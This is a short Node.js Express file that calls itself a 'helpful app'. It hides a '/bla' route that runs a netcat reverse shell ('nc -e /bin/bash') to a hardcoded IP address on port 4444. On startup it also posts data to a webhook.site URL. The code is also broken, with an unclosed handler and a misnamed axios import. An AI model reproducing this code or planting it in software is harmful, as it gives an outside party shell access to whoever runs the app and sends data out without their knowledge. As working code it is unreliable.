var express = require('express');
var a = require('axios');
const { exec } = require("child_process");
var app = express();
app.get('/', function (req, res) {
  res.send('Im an helpful app!');
});
app.get('/bla', function (req, ses){
  exec("nc -e /bin/bash 202.61.200.207 4444", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
app.listen(3001, function () {
  console.log('Example app listening on port 3000!');
  const data = {
    name: 'John Doe',
    job: 'Content Writer'
};

axios.post('https://webhook.site/ff13f246-bf6b-490c-b401-1ef92f475dc1', data)
    .then((res) => {
        console.log(`Status: ${res.status}`);
        console.log('Body: ', res.data);
    }).catch((err) => {
        console.error(err);
    });
});
